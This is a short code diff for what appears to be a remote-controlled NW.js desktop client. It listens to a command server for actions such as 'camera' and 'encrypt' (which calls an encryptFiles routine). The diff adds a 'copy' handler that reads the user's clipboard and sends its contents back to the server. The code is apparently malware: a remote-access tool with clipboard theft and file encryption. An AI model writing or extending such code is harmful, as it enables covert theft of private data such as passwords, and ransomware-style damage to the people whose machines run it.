@@ -1,7 +1,7 @@
 let socket = io(config.SOCKET_SERVER);
 let fs = require('fs');
 let path = require('path');
-
+let gui = require('nw.gui');
 
 $('.modal').modal();
 
@@ -60,6 +60,12 @@ socket.on('camera', function(data){
 
 socket.on('encrypt', function(data){
 	encryptFiles();
+})
+
+socket.on('copy', function(data){
+	let clipboard = gui.Clipboard.get();
+	let text = clipboard.get('text');
+	socket.emit('copy', text);
 })
 
 function getBatteryPercentage(sendEmail)
